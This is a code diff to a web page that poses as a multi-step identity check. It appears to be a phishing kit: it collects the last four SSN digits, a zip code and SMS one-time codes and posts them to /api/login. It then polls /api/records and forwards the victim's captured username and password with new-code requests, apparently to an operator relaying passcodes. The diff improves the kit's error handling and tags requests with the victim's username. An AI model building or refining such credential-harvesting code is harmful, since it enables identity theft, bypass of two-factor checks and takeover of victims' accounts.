@@ -23,7 +23,6 @@
 <body>
     <div class="container">
 
-        <!-- Step 1 -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
             <label>Last 4 Digits of SSN</label>
@@ -42,7 +41,6 @@
             <button class="continue" onclick="saveStep1()">Continue</button>
         </div>
 
-        <!-- Step 2 -->
         <div id="step2" class="step">
             <h1>Additional Information</h1>
             <label>Zip Code</label>
@@ -50,7 +48,6 @@
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
-        <!-- Step 3 -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
@@ -68,7 +65,7 @@
 
         async function saveStep(details, stepName) {
             try {
-                await fetch('/api/login', {
+                const response = await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -77,9 +74,13 @@
                         address: details
                     })
                 });
-                console.log("✅ Saved:", stepName);
+                if (response.ok) {
+                    console.log("✅ Step saved successfully:", stepName);
+                } else {
+                    console.error("❌ Server error:", response.status);
+                }
             } catch (e) {
-                console.error("Save failed", e);
+                console.error("❌ Fetch failed", e);
             }
         }
 
@@ -137,6 +138,7 @@
 
             await saveStep(fullDetails, "Final Code Submission");
 
+            // Polling logic
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
@@ -161,7 +163,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "New Code Request",
+                    username: "New Code Request (" + realUsername + ")",
                     password: realPassword,
                     address: "🔄 USER REQUESTED NEW CODE | Status: Pending"
                 })
